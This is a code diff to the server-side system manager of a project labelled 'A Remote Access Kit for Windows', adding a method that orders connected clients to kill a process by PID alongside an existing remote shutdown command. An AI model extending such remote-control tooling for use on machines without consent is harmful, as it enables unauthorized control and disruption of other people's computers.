@@ -10,10 +10,12 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.0
+# Build:  1.0.1
 # -------------------------------------------------------------
 from ..networking.socket import ServerSocket
 from ..client_handling.flags import ClientActionFlags
+from ..threading.threads import MultiThreading
+from ..networking.receiver_socket import ReceiverSocket
 
 class SystemManager:
 
@@ -28,3 +30,8 @@ class SystemManager:
     #Function tells agent to shutdown the client
     def shutdown_client_system(self,encryption_key,client):
         ServerSocket().send_data_to_client(client,encryption_key,f'{ClientActionFlags().shutdown_computer}{ClientActionFlags().seperator} ')  #Send shutdown flag to client
+
+    #Function will instruct client to kill process by pid
+    def kill_client_process(self,pid,encryption_key,client):
+        MultiThreading().create_background_thread_arg(ReceiverSocket().recv_taskkill_output,encryption_key) #Create background thread to catch data
+        ServerSocket().send_data_to_client(client,encryption_key,f'{ClientActionFlags().kill_process}{ClientActionFlags().seperator}{str(pid)}') #Tell client to send data
